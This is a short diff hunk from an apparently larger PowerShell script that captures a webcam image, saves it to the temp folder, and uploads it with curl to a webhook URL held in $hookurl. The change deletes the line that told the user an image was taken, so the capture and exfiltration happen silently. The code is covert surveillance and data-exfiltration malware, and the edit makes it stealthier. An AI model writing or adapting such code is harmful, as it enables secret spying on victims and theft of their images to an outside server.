@@ -835,7 +835,6 @@ $imageBytes = [Webcam.webcam]::GetImage()
 $tempDir = [System.IO.Path]::GetTempPath()
 $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
 [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
-Write-Host "Image captured and saved to: $imagePath"
     sleep 1
     curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
     sleep 1
